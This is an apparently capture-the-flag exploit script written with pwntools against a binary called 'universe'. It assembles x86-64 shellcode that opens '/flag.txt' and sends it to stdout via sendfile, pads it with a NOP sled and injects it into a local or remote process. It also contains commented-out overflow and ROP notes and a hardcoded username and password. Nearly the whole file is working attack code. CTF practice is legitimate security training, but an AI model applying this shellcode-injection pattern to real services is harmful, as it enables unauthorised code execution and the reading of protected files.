from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
b *system
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './universe'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Start program
offset = 47
username = "top0n3"
password = "uyscuti"
io = start()

######################### send information to the program #####################
#io.sendline(username)
#print(io.recvuntil(b"to proceed: "))
#payload =flat({offset: [ret_addr]})
#payload = cyclic(offset) + b'\x0d'
#io.sendline(payload)


###################################### shellcode ############################
#shellcode = asm(shellcraft.cat("flag.txt"))

################### write my shellcode ###################################
#we must write this shellcode to rea a file
"""# int fd = openat(-100, "flag.txt", O_RDONLY); // imagine that RW_ADDR points to the string "/path/to/flag.txt"
        read(fd, flag, 19);
                //printf("%s\n", flag);
    sendfile(1, fd, 0, 0xffff);

"""
iopenat_n = 257 
sendfile_n = 40

shellcode = asm(shellcraft.pushstr("/flag.txt", True)) + asm(shellcraft.openat(-100, "rsp", 0)) 

# sendfile(stdout, rax, 0, 0x100)

shellcode += asm('''
     mov rsi, rax
     push SYS_sendfile
     pop rax
     push 1
     pop rdi
     syscall

''')


payload = payload = b'\x90' * (0x1000 - len(shellcode))  + shellcode
io.sendline(payload)
#print(io.recvuntil(b"feedbacks for this game:"))
io.interactive()
#io.sendline(shellcode)

# Offset of pop_rdi gadget from ropper
# We need to find the PIEBASE before we can use
#io.interactive()
